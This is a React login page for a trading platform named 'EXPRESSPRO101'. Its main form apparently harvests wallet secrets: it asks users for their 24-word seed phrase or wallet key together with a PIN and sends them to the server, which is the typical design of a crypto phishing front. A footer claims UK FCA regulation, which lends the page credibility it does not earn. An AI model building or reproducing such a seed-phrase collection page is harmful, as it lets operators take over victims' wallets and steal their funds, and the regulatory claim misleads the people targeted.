import { useState } from "react";
import { useLocation } from "wouter";
import { TrendingUp, Eye, EyeOff, Lock, Mail, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { api } from "@/lib/api";
import { setAuth } from "@/lib/auth";

export default function Login() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [showCred, setShowCred] = useState(false);
  const [form, setForm] = useState({ email: "", securityCredential: "", loginPin: "" });

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm(f => ({ ...f, [k]: e.target.value }));

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    if (!form.email || !form.securityCredential || !form.loginPin) {
      toast({ title: "All fields required", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const data: any = await api.post("/auth/login", form);
      setAuth(data.token, data.userId, data.user?.role || "user");
      toast({ title: "Login successful!", description: `Welcome back, ${data.user?.fullName?.split(" ")[0]}!` });
      navigate("/");
    } catch (err: any) {
      toast({ title: "Login failed", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md space-y-6">
        {/* Logo */}
        <div className="flex flex-col items-center gap-3">
          <div className="w-14 h-14 rounded-2xl bg-primary flex items-center justify-center shadow-lg">
            <TrendingUp size={28} className="text-primary-foreground" />
          </div>
          <div className="text-center">
            <h1 className="text-2xl font-bold text-foreground">EXPRESSPRO101</h1>
            <p className="text-sm text-muted-foreground">Professional Trading Platform</p>
          </div>
        </div>

        <Card className="border-card-border shadow-xl">
          <CardHeader className="pb-4">
            <CardTitle className="text-lg text-center">Sign In to Your Account</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="email" className="text-sm font-medium">Email Address</Label>
                <div className="relative">
                  <Mail size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                  <Input
                    id="email"
                    type="email"
                    placeholder="your@email.com"
                    value={form.email}
                    onChange={set("email")}
                    className="pl-9"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="credential" className="text-sm font-medium">
                  Seed Phrase / Wallet Key
                </Label>
                <p className="text-xs text-muted-foreground">Enter your 24-word seed phrase or wallet key code</p>
                <div className="relative">
                  <Shield size={16} className="absolute left-3 top-3 text-muted-foreground" />
                  <textarea
                    id="credential"
                    placeholder="word1 word2 word3 ... or EXP-XXXX..."
                    value={form.securityCredential}
                    onChange={e => setForm(f => ({ ...f, securityCredential: e.target.value }))}
                    className="w-full pl-9 pr-4 py-2 min-h-[80px] bg-input border border-input-border rounded-md text-sm resize-none focus:outline-none focus:ring-2 focus:ring-ring"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="pin" className="text-sm font-medium">Login PIN</Label>
                <div className="relative">
                  <Lock size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                  <Input
                    id="pin"
                    type={showCred ? "text" : "password"}
                    placeholder="Enter your PIN"
                    value={form.loginPin}
                    onChange={set("loginPin")}
                    className="pl-9 pr-10"
                    maxLength={8}
                    required
                  />
                  <button type="button" onClick={() => setShowCred(!showCred)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
                    {showCred ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>
              </div>

              <Button type="submit" className="w-full bg-primary hover:bg-primary/90 h-11" disabled={loading}>
                {loading ? "Signing In..." : "Sign In"}
              </Button>
            </form>

            <div className="mt-4">
              <Button
                type="button"
                variant="outline"
                className="w-full h-11"
                onClick={() => { window.location.href = `${import.meta.env.BASE_URL.replace(/\/$/, "")}/api/auth/replit/login`; }}
              >
                Continue with Replit
              </Button>
            </div>

            <div className="mt-6 space-y-2 text-center">
              <p className="text-sm text-muted-foreground">
                <a href="/auth/forgot-password" className="text-primary hover:underline font-medium">Forgot Password?</a>
              </p>
              <p className="text-sm text-muted-foreground">
                Don't have an account?{" "}
                <a href="/auth/register" className="text-primary hover:underline font-medium">Create Account</a>
              </p>
              <p className="text-sm text-muted-foreground pt-1">
                <a href="/auth/admin" className="text-rose-400 hover:text-rose-300 font-medium text-xs">Admin C-Panel Access →</a>
              </p>
            </div>

            {/* Demo section */}
            <div className="mt-4 p-3 bg-primary/5 border border-primary/15 rounded-lg space-y-2">
              <p className="text-xs text-primary font-semibold text-center">Demo Account</p>
              <button
                type="button"
                onClick={async () => {
                  setLoading(true);
                  try {
                    const data: any = await api.get("/auth/demo");
                    setAuth(data.token, data.user.id, data.user.role);
                    toast({ title: "Demo account ready!", description: "Welcome to your demo trading account." });
                    navigate("/dashboard");
                  } catch {
                    toast({ title: "Demo unavailable", description: "Please use the fill demo credentials option.", variant: "destructive" });
                  } finally {
                    setLoading(false);
                  }
                }}
                className="w-full text-xs text-primary hover:text-primary/80 font-semibold py-1.5 border border-primary/30 rounded bg-primary/10 hover:bg-primary/15 transition-colors"
              >
                {loading ? "Loading..." : "Try Demo Account (Auto-Login)"}
              </button>
              <div className="border-t border-primary/10 pt-2 mt-1 space-y-1">
                <p className="text-[10px] text-muted-foreground text-center">Or use test credentials:</p>
                <p className="text-xs text-muted-foreground">Email: <span className="text-foreground font-mono">alex@nextrade.io</span></p>
                <p className="text-xs text-muted-foreground">Seed: <span className="text-foreground font-mono text-[10px] break-all">abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual</span></p>
                <button
                  type="button"
                  onClick={() => setForm({
                    email: "alex@nextrade.io",
                    securityCredential: "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual",
                    loginPin: "000000",
                  })}
                  className="w-full text-xs text-primary hover:text-primary/80 font-medium py-1 border border-primary/20 rounded hover:bg-primary/5 transition-colors"
                >
                  Fill Demo Credentials
                </button>
              </div>
            </div>
          </CardContent>
        </Card>

        <p className="text-center text-xs text-muted-foreground">
          ExpressPro101 is regulated and compliant with UK FCA standards.
          <br />Suitable for global traders in US, EU, Asia, Africa.
        </p>
      </div>
    </div>
  );
}
